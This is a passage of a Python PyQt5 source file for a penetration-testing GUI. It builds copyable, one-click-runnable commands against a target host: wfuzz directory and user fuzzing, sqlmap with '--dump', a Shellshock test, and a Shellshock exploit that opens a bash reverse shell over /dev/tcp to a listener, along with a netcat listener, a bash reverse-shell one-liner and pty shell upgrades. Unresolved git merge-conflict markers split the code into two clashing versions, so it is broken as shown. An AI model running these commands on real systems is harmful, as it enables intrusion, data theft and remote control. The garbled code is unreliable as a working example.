            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan3_Copy)
        label_layout.addWidget(self.wfuzzF_Scan3_Run)
        label_layout.addWidget(self.wfuzzF_Scan3)
        self.tab2_container_layout.insertLayout(66, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan4
        if hasattr(self, 'wfuzzF_Scan4'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4)
            self.wfuzzF_Scan4.deleteLater()
        self.wfuzzF_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan4 copy button
        if hasattr(self, 'wfuzzF_Scan4_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Copy)
            self.wfuzzF_Scan4_Copy.deleteLater()
        self.wfuzzF_Scan4_Copy = QPushButton()
        self.wfuzzF_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan4.text()))
        self.wfuzzF_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan4 run button
        if hasattr(self, 'wfuzzF_Scan4_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Run)
            self.wfuzzF_Scan4_Run.deleteLater()
        self.wfuzzF_Scan4_Run = QPushButton()
        self.wfuzzF_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan4.text() + "; bash"
        self.wfuzzF_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan4_Copy)
        label_layout.addWidget(self.wfuzzF_Scan4_Run)
        label_layout.addWidget(self.wfuzzF_Scan4)
        self.tab2_container_layout.insertLayout(67, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_spacer1
        if hasattr(self, 'wfuzzF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_spacer1)
            self.wfuzzF_spacer1.deleteLater()
        self.wfuzzF_spacer1 = QLabel()
        self.wfuzzF_spacer1.setFixedWidth(40)
        self.wfuzzF_spacer1.setFixedHeight(20)

        # wfuzzF_spacer & divider layout
        self.tab2_container_layout.insertWidget(68, self.wfuzzF_spacer1)

# wfuzzUsers
        if hasattr(self, 'wfuzzUsers'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers)
            self.wfuzzUsers.deleteLater()
        self.wfuzzUsers = QLabel("[+ Wfuzz Users]")
        self.wfuzzUsers.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(69,self.wfuzzUsers)

        # wfuzzUsers_Scan1
        if hasattr(self, 'wfuzzUsers_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1)
            self.wfuzzUsers_Scan1.deleteLater()
        self.wfuzzUsers_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403  \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzUsers_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzUsers_Scan1 copy button
        if hasattr(self, 'wfuzzUsers_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Copy)
            self.wfuzzUsers_Scan1_Copy.deleteLater()
        self.wfuzzUsers_Scan1_Copy = QPushButton()
        self.wfuzzUsers_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzUsers_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzUsers_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzUsers_Scan1.text()))
        self.wfuzzUsers_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzUsers_Scan1 run button
        if hasattr(self, 'wfuzzUsers_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Run)
            self.wfuzzUsers_Scan1_Run.deleteLater()
        self.wfuzzUsers_Scan1_Run = QPushButton()
        self.wfuzzUsers_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzUsers_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzUsers_Scan1.text() + "; bash"
        self.wfuzzUsers_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzUsers_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzUsers_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzUsers_Scan1_Copy)
        label_layout.addWidget(self.wfuzzUsers_Scan1_Run)
        label_layout.addWidget(self.wfuzzUsers_Scan1)
        self.tab2_container_layout.insertLayout(70, label_layout)
        self.tab2_container_layout.addStretch()

         # wfuzz_divider 1
        if hasattr(self, 'wfuzz_divider1'):
            self.tab2_container_layout.removeWidget(self.wfuzz_divider1)
            self.wfuzz_divider1.deleteLater()
        self.wfuzz_divider1 = QFrame()
        self.wfuzz_divider1.setFrameShape(QFrame.HLine)
        self.wfuzz_divider1.setLineWidth(3)
        self.wfuzz_divider1.setStyleSheet("color: #20C20E;")
        
        # wfuzz_divider2
        if hasattr(self, 'wfuzz_divider2'):
            self.tab2_container_layout.removeWidget(self.wfuzz_divider2)
            self.wfuzz_divider2.deleteLater()
        self.wfuzz_divider2 = QFrame()
        self.wfuzz_divider2.setFrameShape(QFrame.HLine)
        self.wfuzz_divider2.setLineWidth(3)
        self.wfuzz_divider2.setStyleSheet("color: #20C20E;")
        
        # wfuzz_spacer1
        if hasattr(self, 'wfuzz_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzz_spacer1)
            self.wfuzz_spacer1.deleteLater()
        self.wfuzz_spacer1 = QLabel()
        self.wfuzz_spacer1.setFixedWidth(40)
        self.wfuzz_spacer1.setFixedHeight(50)
        
        # wfuzz_spacer2
        if hasattr(self, 'wfuzz_spacer2'):
            self.tab2_container_layout.removeWidget(self.wfuzz_spacer2)
            self.wfuzz_spacer2.deleteLater()
        self.wfuzz_spacer2 = QLabel()
        self.wfuzz_spacer2.setFixedWidth(40)
        self.wfuzz_spacer2.setFixedHeight(50)

        # wfuzz_spacer & divider layout
        self.tab2_container_layout.insertWidget(71, self.wfuzz_spacer1)
        self.tab2_container_layout.insertWidget(72, self.wfuzz_divider1)
        self.tab2_container_layout.insertWidget(73, self.wfuzz_divider2)
        self.tab2_container_layout.insertWidget(74, self.wfuzz_spacer2)
        self.tab2_container_layout.addStretch()


# SQLMap
        if hasattr(self, 'SQLMap'):
            self.tab2_container_layout.removeWidget(self.SQLMap)
            self.SQLMap.deleteLater()
        self.SQLMap = QLabel("[+ SQLMap]")
        self.SQLMap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(75,self.SQLMap)

        # SQLMap_Scan1
        if hasattr(self, 'SQLMap_Scan1'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1)
            self.SQLMap_Scan1.deleteLater()
        self.SQLMap_Scan1 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl")
        self.SQLMap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # SQLMap_Scan1 copy button
        if hasattr(self, 'SQLMap_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Copy)
            self.SQLMap_Scan1_Copy.deleteLater()
        self.SQLMap_Scan1_Copy = QPushButton()
        self.SQLMap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.SQLMap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.SQLMap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan1.text()))
        self.SQLMap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan1 run button
        if hasattr(self, 'SQLMap_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Run)
            self.SQLMap_Scan1_Run.deleteLater()
        self.SQLMap_Scan1_Run = QPushButton()
        self.SQLMap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.SQLMap_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.SQLMap_Scan1.text() + "; bash"
        self.SQLMap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.SQLMap_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.SQLMap_Scan1_Copy)
        label_layout.addWidget(self.SQLMap_Scan1_Run)
        label_layout.addWidget(self.SQLMap_Scan1)
        self.tab2_container_layout.insertLayout(76, label_layout)
        self.tab2_container_layout.addStretch()

        # SQLMap_Scan2
        if hasattr(self, 'SQLMap_Scan2'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2)
            self.SQLMap_Scan2.deleteLater()
        self.SQLMap_Scan2 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=4 --risk=3 --dump")
        self.SQLMap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # SQLMap_Scan2 copy button
        if hasattr(self, 'SQLMap_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Copy)
            self.SQLMap_Scan2_Copy.deleteLater()
        self.SQLMap_Scan2_Copy = QPushButton()
        self.SQLMap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.SQLMap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.SQLMap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan2.text()))
        self.SQLMap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan2 run button
        if hasattr(self, 'SQLMap_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Run)
            self.SQLMap_Scan2_Run.deleteLater()
        self.SQLMap_Scan2_Run = QPushButton()
        self.SQLMap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.SQLMap_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.SQLMap_Scan2.text() + "; bash"
        self.SQLMap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.SQLMap_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # SQLMap_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.SQLMap_Scan2_Copy)
        label_layout.addWidget(self.SQLMap_Scan2_Run)
        label_layout.addWidget(self.SQLMap_Scan2)
        self.tab2_container_layout.insertLayout(77, label_layout)
        self.tab2_container_layout.addStretch()

        # sqlmap_divider 1
        if hasattr(self, 'sqlmap_divider1'):
            self.tab2_container_layout.removeWidget(self.sqlmap_divider1)
            self.sqlmap_divider1.deleteLater()
        self.sqlmap_divider1 = QFrame()
        self.sqlmap_divider1.setFrameShape(QFrame.HLine)
        self.sqlmap_divider1.setLineWidth(3)
        self.sqlmap_divider1.setStyleSheet("color: #20C20E;")
        
        # sqlmap_divider2
        if hasattr(self, 'sqlmap_divider2'):
            self.tab2_container_layout.removeWidget(self.sqlmap_divider2)
            self.sqlmap_divider2.deleteLater()
        self.sqlmap_divider2 = QFrame()
        self.sqlmap_divider2.setFrameShape(QFrame.HLine)
        self.sqlmap_divider2.setLineWidth(3)
        self.sqlmap_divider2.setStyleSheet("color: #20C20E;")
        
        # sqlmap_spacer1
        if hasattr(self, 'sqlmap_spacer1'):
            self.tab2_container_layout.removeWidget(self.sqlmap_spacer1)
            self.sqlmap_spacer1.deleteLater()
        self.sqlmap_spacer1 = QLabel()
        self.sqlmap_spacer1.setFixedWidth(40)
        self.sqlmap_spacer1.setFixedHeight(50)
        
        # sqlmap_spacer2
        if hasattr(self, 'sqlmap_spacer2'):
            self.tab2_container_layout.removeWidget(self.sqlmap_spacer2)
            self.sqlmap_spacer2.deleteLater()
        self.sqlmap_spacer2 = QLabel()
        self.sqlmap_spacer2.setFixedWidth(40)
        self.sqlmap_spacer2.setFixedHeight(50)

        # sqlmap_spacer & divider layout
        self.tab2_container_layout.insertWidget(78, self.sqlmap_spacer1)
        self.tab2_container_layout.insertWidget(79, self.sqlmap_divider1)
        self.tab2_container_layout.insertWidget(80, self.sqlmap_divider2)
        self.tab2_container_layout.insertWidget(81, self.sqlmap_spacer2)
        self.tab2_container_layout.addStretch()

# shellshockTest
        if hasattr(self, 'shellshockTest'):
            self.tab2_container_layout.removeWidget(self.shellshockTest)
            self.shellshockTest.deleteLater()
        self.shellshockTest = QLabel("[+ Test for Shell Shock]")
        self.shellshockTest.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(82,self.shellshockTest)

        # shellshockTest_Scan1
        if hasattr(self, 'shellshockTest_Scan1'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1)
            self.shellshockTest_Scan1.deleteLater()
        self.shellshockTest_Scan1 = QLabel("curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'")
        self.shellshockTest_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockTest_Scan1 copy button
        if hasattr(self, 'shellshockTest_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Copy)
            self.shellshockTest_Scan1_Copy.deleteLater()
        self.shellshockTest_Scan1_Copy = QPushButton()
        self.shellshockTest_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockTest_Scan1_Copy.setFixedSize(QSize(20,20))
        self.shellshockTest_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockTest_Scan1.text()))
        self.shellshockTest_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockTest_Scan1 run button
        if hasattr(self, 'shellshockTest_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Run)
            self.shellshockTest_Scan1_Run.deleteLater()
        self.shellshockTest_Scan1_Run = QPushButton()
        self.shellshockTest_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockTest_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockTest_Scan1.text() + "; bash"
        self.shellshockTest_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockTest_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockTest_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockTest_Scan1_Copy)
        label_layout.addWidget(self.shellshockTest_Scan1_Run)
        label_layout.addWidget(self.shellshockTest_Scan1)
        self.tab2_container_layout.insertLayout(83, label_layout)
        self.tab2_container_layout.addStretch()

        # shellshockTest_spacer1
        if hasattr(self, 'shellshockTest_spacer1'):
            self.tab2_container_layout.removeWidget(self.shellshockTest_spacer1)
            self.shellshockTest_spacer1.deleteLater()
        self.shellshockTest_spacer1 = QLabel()
        self.shellshockTest_spacer1.setFixedWidth(40)
        self.shellshockTest_spacer1.setFixedHeight(20)

        # shellshockTest_spacer & divider layout
        self.tab2_container_layout.insertWidget(84, self.shellshockTest_spacer1)

# shellshockExploit
        if hasattr(self, 'shellshockExploit'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit)
            self.shellshockExploit.deleteLater()
        self.shellshockExploit = QLabel("[+ Exploit Shell Shock]")
        self.shellshockExploit.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(85,self.shellshockExploit)

        # shellshockExploit_Scan1
        if hasattr(self, 'shellshockExploit_Scan1'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1)
            self.shellshockExploit_Scan1.deleteLater()
        self.shellshockExploit_Scan1 = QLabel("nc -nlvp " + self.lport)
        self.shellshockExploit_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockExploit_Scan1 copy button
        if hasattr(self, 'shellshockExploit_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Copy)
            self.shellshockExploit_Scan1_Copy.deleteLater()
        self.shellshockExploit_Scan1_Copy = QPushButton()
        self.shellshockExploit_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockExploit_Scan1_Copy.setFixedSize(QSize(20,20))
        self.shellshockExploit_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan1.text()))
        self.shellshockExploit_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan1 run button
        if hasattr(self, 'shellshockExploit_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Run)
            self.shellshockExploit_Scan1_Run.deleteLater()
        self.shellshockExploit_Scan1_Run = QPushButton()
        self.shellshockExploit_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockExploit_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockExploit_Scan1.text() + "; bash"
        self.shellshockExploit_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockExploit_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockExploit_Scan1_Copy)
        label_layout.addWidget(self.shellshockExploit_Scan1_Run)
        label_layout.addWidget(self.shellshockExploit_Scan1)
        self.tab2_container_layout.insertLayout(86, label_layout)
        self.tab2_container_layout.addStretch()

        # shellshockExploit_Scan2
        if hasattr(self, 'shellshockExploit_Scan2'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2)
            self.shellshockExploit_Scan2.deleteLater()
        self.shellshockExploit_Scan2 = QLabel("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi")
        self.shellshockExploit_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # shellshockExploit_Scan2 copy button
        if hasattr(self, 'shellshockExploit_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Copy)
            self.shellshockExploit_Scan2_Copy.deleteLater()
        self.shellshockExploit_Scan2_Copy = QPushButton()
        self.shellshockExploit_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.shellshockExploit_Scan2_Copy.setFixedSize(QSize(20,20))
        self.shellshockExploit_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan2.text()))
        self.shellshockExploit_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan2 run button
        if hasattr(self, 'shellshockExploit_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Run)
            self.shellshockExploit_Scan2_Run.deleteLater()
        self.shellshockExploit_Scan2_Run = QPushButton()
        self.shellshockExploit_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.shellshockExploit_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.shellshockExploit_Scan2.text() + "; bash"
        self.shellshockExploit_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.shellshockExploit_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # shellshockExploit_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.shellshockExploit_Scan2_Copy)
        label_layout.addWidget(self.shellshockExploit_Scan2_Run)
        label_layout.addWidget(self.shellshockExploit_Scan2)
        self.tab2_container_layout.insertLayout(87, label_layout)
        self.tab2_container_layout.addStretch()

         # shellshock_divider 1
        if hasattr(self, 'shellshock_divider1'):
            self.tab2_container_layout.removeWidget(self.shellshock_divider1)
            self.shellshock_divider1.deleteLater()
        self.shellshock_divider1 = QFrame()
        self.shellshock_divider1.setFrameShape(QFrame.HLine)
        self.shellshock_divider1.setLineWidth(3)
        self.shellshock_divider1.setStyleSheet("color: #20C20E;")
        
        # shellshock_divider2
        if hasattr(self, 'shellshock_divider2'):
            self.tab2_container_layout.removeWidget(self.shellshock_divider2)
            self.shellshock_divider2.deleteLater()
        self.shellshock_divider2 = QFrame()
        self.shellshock_divider2.setFrameShape(QFrame.HLine)
        self.shellshock_divider2.setLineWidth(3)
        self.shellshock_divider2.setStyleSheet("color: #20C20E;")
        
        # shellshock_spacer1
        if hasattr(self, 'shellshock_spacer1'):
            self.tab2_container_layout.removeWidget(self.shellshock_spacer1)
            self.shellshock_spacer1.deleteLater()
        self.shellshock_spacer1 = QLabel()
        self.shellshock_spacer1.setFixedWidth(40)
        self.shellshock_spacer1.setFixedHeight(50)
        
        # shellshock_spacer2
        if hasattr(self, 'shellshock_spacer2'):
            self.tab2_container_layout.removeWidget(self.shellshock_spacer2)
            self.shellshock_spacer2.deleteLater()
        self.shellshock_spacer2 = QLabel()
        self.shellshock_spacer2.setFixedWidth(40)
        self.shellshock_spacer2.setFixedHeight(50)

        # shellshock_spacer & divider layout
        self.tab2_container_layout.insertWidget(88, self.shellshock_spacer1)
        self.tab2_container_layout.insertWidget(89, self.shellshock_divider1)
        self.tab2_container_layout.insertWidget(90, self.shellshock_divider2)
        self.tab2_container_layout.insertWidget(91, self.shellshock_spacer2)
        self.tab2_container_layout.addStretch()


#################################################################################
##### LPE
    def lpe(self):
        rhost = "127.0.0.1"
        if not hasattr(self, 'container'):
            self.container = QWidget()
            self.tab3_container_layout = QVBoxLayout(self.container)
            self.container.setLayout(self.tab3_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.container)
            self.scroll.setWidgetResizable(True)
            self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab3_container_layout.setContentsMargins(0,0,0,0)
            self.container.adjustSize()
            
            self.tab3.setLayout(QVBoxLayout())
            self.tab3.layout().addWidget(self.scroll)

    def wpe(self):
        rhost = "127.0.0.1"
        if not hasattr(self, 'container'):
            self.container = QWidget()
            self.tab4_container_layout = QVBoxLayout(self.container)
            self.container.setLayout(self.tab4_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.container)
            self.scroll.setWidgetResizable(True)
            self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab4_container_layout.setContentsMargins(0,0,0,0)
            self.container.adjustSize()
            
            self.tab4.setLayout(QVBoxLayout())
            self.tab4.layout().addWidget(self.scroll)

    def tty(self):
        self.rhost = "127.0.0.1"
        self.lport = "4444"
        if not hasattr(self, 'container'):
            self.container = QWidget()
            self.tab5_container_layout = QVBoxLayout(self.container)
            self.container.setLayout(self.tab5_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.container)
            self.scroll.setWidgetResizable(True)
            self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab5_container_layout.setContentsMargins(0,0,0,0)
            self.container.adjustSize()
            
            self.tab5.setLayout(QVBoxLayout())
            self.tab5.layout().addWidget(self.scroll)


    def revShells(self):
        self.lport = "80"
        self.rport = "4444"
        self.rhost = "127.0.0.1"
        if not hasattr(self, 'tab6_container'):
            self.tab6_container = QWidget()
            self.tab6_container_layout = QVBoxLayout(self.tab6_container)
            self.tab6_container.setLayout(self.tab6_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab6_container)
            self.scroll.setWidgetResizable(True)
            self.tab6_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab6_container_layout.setContentsMargins(0,0,0,0)
            self.tab6_container.adjustSize()
            
            self.tab6.setLayout(QVBoxLayout())
            self.tab6.layout().addWidget(self.scroll)

   
# bash
        if hasattr(self, 'bash'):
            self.tab6_container_layout.removeWidget(self.bash)
            self.bash.deleteLater()
        self.bash = QLabel("[+ BASH]")
        self.bash.setStyleSheet(
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
<<<<<<< HEAD
        self.container_layout.addWidget(shellPE)
        shellPE_Scan1 = QtWidgets.QLabel(f"python -c 'import pty; pty.spawn(\"/bin/bash\")'")
        shellPE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellPE_Scan1)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
        
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan1)
        self.container_layout.addLayout(label_layout)
        
        shellPE_Scan2 = QtWidgets.QLabel(f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        shellPE_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellPE_Scan2)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan2.text()))
        copy_button.setStyleSheet(
        "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)

        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        shellPE_Scan3 = QtWidgets.QLabel("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp")
        shellPE_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +    
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(shellPE_Scan3)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan3)
        self.container_layout.addLayout(label_layout)
#############################################################################  
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        self.container_layout.addStretch()

    





    









##############################################################################


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = MainWindow()
    sys.exit(app.exec_())
    
=======
        self.tab6_container_layout.insertWidget(0,self.bash)

        # bash_Scan1
        if hasattr(self, 'bash_Scan1'):
            self.tab6_container_layout.removeWidget(self.bash_Scan1)
            self.bash_Scan1.deleteLater()
        self.bash_Scan1 = QLabel("bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1")
        self.bash_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # bash_Scan1 copy button
        if hasattr(self, 'bash_Scan1_Copy'):
